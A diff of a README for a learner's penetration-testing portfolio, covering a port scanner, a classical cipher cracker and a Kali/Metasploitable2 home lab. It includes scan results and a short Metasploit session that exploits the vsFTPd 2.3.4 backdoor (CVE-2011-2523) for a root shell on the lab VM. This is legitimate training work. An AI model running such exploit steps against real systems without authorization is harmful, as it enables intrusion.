@@ -1,91 +1,102 @@
-# 🔐 CyberSec Portfolio — Phase 1
+# 🔐 CyberScan — Penetration Testing Toolkit
 
-**Author:** Mahembajr  
+![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat&logo=python)
+![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat)
+![License](https://img.shields.io/badge/License-MIT-green?style=flat)
+![Phase](https://img.shields.io/badge/Phase-1%20Complete-00ff88?style=flat)
+
+**Author:** Laurent Mahemba ([@Mahembajr](https://github.com/Mahembajr))  
 **Started:** February 17, 2026  
 **Goal:** Self-directed cybersecurity learning path → penetration testing career
 
-This repository documents my Phase 1 cybersecurity projects — built from scratch, tested against real targets, and documented with professional writeups. Every tool here runs on real networks and produces real results.
+A growing collection of offensive security tools, home lab exploits, and
+CTF writeups — built from scratch to deeply understand how attacks work at
+the network and cryptographic level.
 
 ---
 
 ## 📁 Repository Structure
-
 ```
 cyberscan/
-├── port_scanner.py          ← Multithreaded TCP port scanner
-├── cipher_cracker.py        ← Caesar & Vigenère encrypt/decrypt/crack
-├── README.md                ← You are here
+├── port_scanner.py       ← Multithreaded TCP port scanner with banner grabbing
+├── cipher_cracker.py     ← Caesar & Vigenère encrypt / decrypt / crack
+├── requirements.txt      ← Standard library only — no dependencies
+├── README.md             ← You are here
 └── writeups/
-    └── CVE-2011-2523.md     ← vsFTPd backdoor exploit writeup
+    └── CVE-2011-2523.md  ← vsFTPd backdoor exploit — root shell achieved
 ```
 
 ---
 
-## 🛠️ Project 1 — Python Port Scanner
+## 🛠️ Tool 1 — Python Port Scanner
 
-### What it does
-A multithreaded TCP port scanner that performs service fingerprinting and banner grabbing — the same core technique used in professional penetration tests. Rebuilt the core functionality of nmap from scratch using only Python's standard library.
+A multithreaded TCP port scanner with service fingerprinting and banner
+grabbing — the same core technique used in professional penetration tests.
+Built from scratch using only Python's standard library, no nmap required.
 
-### Key features
+### Features
+
 - Scans up to 65,535 ports using 100 concurrent threads
-- Banner grabbing identifies exact software versions running on open ports
-- Service fingerprinting maps ports to known services (SSH, HTTP, SMB, etc.)
+- Banner grabbing identifies exact software versions on open ports
+- Service fingerprinting maps ports to known services (SSH, HTTP, SMB, FTP...)
 - Threaded queue architecture — 1,024 ports scanned in ~11 seconds
-
-### Concepts learned
-- TCP/IP and the 3-way handshake (SYN → SYN-ACK → ACK)
-- Python sockets — the foundation of all network programming
-- Multithreading and thread-safe queues
-- Banner grabbing and service version fingerprinting
-- How version numbers map to CVE vulnerabilities
+- Directly maps discovered versions to CVE vulnerabilities
 
 ### Usage
 ```bash
+python port_scanner.py <target> <start_port> <end_port>
+
+# Examples
 python port_scanner.py 127.0.0.1 1 1024
 python port_scanner.py scanme.nmap.org 1 1024
 python port_scanner.py 192.168.1.1 1 500
 ```
 
-### Real scan results
+### Real Results
 
-**scanme.nmap.org (45.33.32.156)**
+**scanme.nmap.org (public test target)**
 ```
-Port  22  SSH   → SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
-Port  80  HTTP  → HTTP/1.1 200 OK
-Scanned in 11.17 seconds
+[+] Port  22  OPEN  →  SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
+[+] Port  80  OPEN  →  HTTP/1.1 200 OK
+[*] Scan completed in 11.17 seconds
 ```
 
 **Metasploitable2 home lab (192.168.11.132)**
 ```
-Port  21  FTP     → 220 (vsFTPd 2.3.4)       ← CVE-2011-2523 backdoor
-Port  22  SSH     → SSH-2.0-OpenSSH_4.7p1    ← multiple known CVEs
-Port  23  Telnet  → plaintext auth            ← critical risk
-Port  25  SMTP    → Postfix (Ubuntu)
-Port  53  DNS
-Port  80  HTTP    → web application target
-Port 111  RPC
-Port 139  NetBIOS
-Port 445  SMB
-Port 512  rexec   → "Where are you?"         ← unauthenticated RCE
-Port 513  rlogin
-Port 514  rsh
-Scanned in 2.21 seconds — 12 open ports
+[+] Port  21  OPEN  →  220 (vsFTPd 2.3.4)        ← CVE-2011-2523 BACKDOOR
+[+] Port  22  OPEN  →  SSH-2.0-OpenSSH_4.7p1     ← Multiple known CVEs
+[+] Port  23  OPEN  →  Telnet (plaintext auth)    ← Critical risk
+[+] Port  25  OPEN  →  220 Postfix (Ubuntu)
+[+] Port  53  OPEN  →  DNS
+[+] Port  80  OPEN  →  HTTP web application
+[+] Port 111  OPEN  →  RPC
+[+] Port 139  OPEN  →  NetBIOS
+[+] Port 445  OPEN  →  SMB
+[+] Port 512  OPEN  →  "Where are you?"           ← Unauthenticated RCE
+[+] Port 513  OPEN  →  rlogin
+[+] Port 514  OPEN  →  rsh
+[*] 12 open ports found — Scanned in 2.21 seconds
 ```
 
-**Key finding:** Banner grabbing on port 21 revealed vsFTPd 2.3.4 — a version with a critical backdoor (CVE-2011-2523). This version number directly led to a successful root shell exploit. See writeups/CVE-2011-2523.md.
+> **Key finding:** Banner grabbing on port 21 revealed vsFTPd 2.3.4 — a version
+> with a known backdoor (CVE-2011-2523). This version number directly led to a
+> successful root shell exploit documented in
+> [writeups/CVE-2011-2523.md](writeups/CVE-2011-2523.md).
 
 ---
 
-## 🔐 Project 2 — Cipher Cracker
+## 🔐 Tool 2 — Cipher Cracker
 
-### What it does
-A command-line tool that encrypts, decrypts, and automatically cracks Caesar and Vigenère ciphers with no key required for cracking. Implements the Kasiski examination and Index of Coincidence — the same techniques used to break the Vigenère cipher in 1863.
+Encrypts, decrypts, and automatically cracks Caesar and Vigenère ciphers
+with no key required. Implements the Kasiski examination and Index of
+Coincidence — the same techniques used to break Vigenère in 1863.
 
-### Key features
+### Features
+
 - Caesar cipher: encrypt, decrypt, brute force all 25 shifts
 - Vigenère cipher: encrypt and decrypt with any keyword
 - Vigenère cracker: recovers the key and plaintext from ciphertext alone
-- English word scoring and letter frequency analysis for automatic detection
+- English word scoring and letter frequency analysis for auto-detection
 - Interactive menu interface
 
 ### Usage
@@ -93,78 +104,82 @@ A command-line tool that encrypts, decrypts, and automatically cracks Caesar and
 python cipher_cracker.py
 ```
 
-### Demo — Vigenère crack with no key
+### Demo — Vigenère cracked with no key
 ```
-Input  (ciphertext, key unknown): Yc bvv fgtgfxcsiu, hjfi rv mogv...
-Output (key recovered):           CYBER
-Output (plaintext recovered):     We are discovered, flee at once...
+[INPUT]   Yc bvv fgtgfxcsiu, hjfi rv mogv...   (key unknown)
+[KEY]     CYBER                                  (recovered automatically)
+[OUTPUT]  We are discovered, flee at once...     (plaintext recovered)
 ```
 
-### Why this matters
-Caesar and Vigenère are broken because their key spaces are tiny and statistically detectable. This is exactly why AES-256 uses keys with 2^256 possibilities — making brute force computationally impossible. Understanding why classical ciphers fail teaches you what makes modern ciphers strong.
+> **Why this matters:** Caesar and Vigenère fail because their key spaces are
+> tiny and statistically detectable. This is exactly why AES-256 uses 2^256
+> possible keys — making brute force computationally impossible.
+> Understanding why classical ciphers fail teaches you what makes modern
+> encryption strong.
 
 ---
 
-## 🏠 Project 3 — Home Lab Setup
+## 🏠 Home Lab — Exploit Environment
 
-### What I built
-A fully isolated penetration testing lab on VMware Workstation Player.
-
+### Setup
 ```
-Windows Host (192.168.1.15)
+Windows Host
 └── VMware Workstation Player
-    ├── Kali Linux (192.168.11.131)       ← attacker machine
-    └── Metasploitable2 (192.168.11.132)  ← vulnerable target
+    ├── Kali Linux      192.168.11.131  ← attacker machine
+    └── Metasploitable2 192.168.11.132  ← intentionally vulnerable target
 ```
 
-### First exploit — CVE-2011-2523
+### CVE-2011-2523 — Root Shell Achieved
 
-My port scanner identified vsFTPd 2.3.4 on port 21. Metasploit exploited the backdoor:
-
+Port scanner identified **vsFTPd 2.3.4** on port 21.
+Metasploit exploited the backdoor trigger:
 ```bash
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf6 > set RHOSTS 192.168.11.132
 msf6 > run
 
+[*] Banner: 220 (vsFTPd 2.3.4)
+[*] Backdoor service has been spawned, handling...
 [+] UID: uid=0(root) gid=0(root)
-[*] Command shell session opened
+[*] Command shell session 1 opened
 ```
 
-Result: Full root shell. Complete system compromise. Full writeup in writeups/CVE-2011-2523.md.
+**Result: Full root shell. Complete system compromise.**  
+Full writeup → [writeups/CVE-2011-2523.md](writeups/CVE-2011-2523.md)
+
+---
+
+## 🧠 Skills Demonstrated
+
+| Area | Skills |
+|---|---|
+| Network Security | TCP/IP, port scanning, banner grabbing, service fingerprinting |
+| Exploitation | CVE research, Metasploit, vulnerability identification from version numbers |
+| Cryptography | Classical cipher analysis, frequency analysis, Kasiski examination |
+| Python | Multithreading, sockets, queue architecture, CLI tools |
+| Lab Setup | VMware, Kali Linux, Metasploitable2, isolated network configuration |
 
 ---
 
 ## 🗺️ Roadmap
 
-### Phase 1 — Complete
-- [x] Python port scanner with banner grabbing
-- [x] Caesar and Vigenère cipher cracker
-- [x] Home lab (Kali Linux + Metasploitable2)
-- [x] First exploit — CVE-2011-2523 root shell
-
-### Phase 2 — Web Application Security (next)
-- [ ] SQL injection on DVWA
-- [ ] Cross-site scripting (XSS)
-- [ ] File inclusion vulnerabilities
-- [ ] Burp Suite web proxy
-- [ ] Full web application pentest report
-
-### Phase 3 — Ethical Hacking
-- [ ] TryHackMe CTF writeups
-- [ ] Vulnerability scanner script
-- [ ] Packet analyzer
-
-### Phase 4 — Malware Analysis
-- [ ] Static malware analysis lab
-- [ ] Ghidra reverse engineering
-- [ ] Malware analysis reports
+- [x] **Phase 1** — Network tools, cipher cracker, home lab, first root shell
+- [ ] **Phase 2** — Web application security (DVWA, Burp Suite, SQLi, XSS)
+- [ ] **Phase 3** — TryHackMe CTF writeups, vulnerability scanner
+- [ ] **Phase 4** — Malware analysis lab, Ghidra reverse engineering
 
 ---
 
 ## ⚠️ Legal Notice
 
-All techniques were performed on systems I own. The home lab runs on an isolated private network. Only scan and test systems you own or have written authorization to test.
+All techniques documented here were performed exclusively on systems I own
+or have explicit written permission to test. The home lab runs on an isolated
+private network with no external connectivity. **Never scan or test systems
+without authorization.**
 
 ---
 
-*Self-directed cybersecurity learning path. Goal: penetration tester / ethical hacker.*
+*Self-directed cybersecurity learning path. Goal: penetration tester / ethical hacker.*  
+*Connect: [LinkedIn](https://www.linkedin.com/in/laurent-mahemba/) · 
+[TryHackMe](https://tryhackme.com/p/Mahembajr) · 
+[Portfolio](https://mahembajr.github.io)*
